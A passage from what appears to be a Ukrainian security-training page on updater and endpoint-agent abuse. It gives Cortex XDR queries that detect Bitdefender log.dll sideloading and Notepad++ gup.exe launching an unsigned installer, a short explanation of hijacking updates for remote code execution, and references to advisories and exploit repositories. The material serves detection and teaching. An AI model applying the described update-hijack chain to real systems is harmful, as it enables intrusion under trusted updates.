| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор не для Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ці закономірності стосуються будь-якого updater, який приймає непідписані маніфести або не перевіряє підписантів інсталятора: перехоплення мережі + шкідливий інсталятор + sideloading із власним підписом забезпечують remote code execution під виглядом «довірених» оновлень.

---
## References
- [1] [Консультація з безпеки – Netskope Client для Windows – локальне підвищення привілеїв через підроблений сервер (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Консультація з безпеки Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – плагін Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC-клієнт/exploit для Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [Pwning ASUS DriverHub, MSI Center, Acer Control Centre і Razer Synapse 4 від SensePost](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – локальне підвищення привілеїв через файли з правом запису в Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – підвищення привілеїв у Windows-агенті](https://checkmk.com/werk/16361)
- [10] [PoC-приклади sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer від CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – державні хакерські групи експлуатують ланцюг постачання Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – оновлення інформації про інцидент із перехопленням інфраструктури](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – обхід виправлення CVE-2025-0309 у Netskope Client для Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – виявлення вразливостей підвищення привілеїв у Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: від gRPC до SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
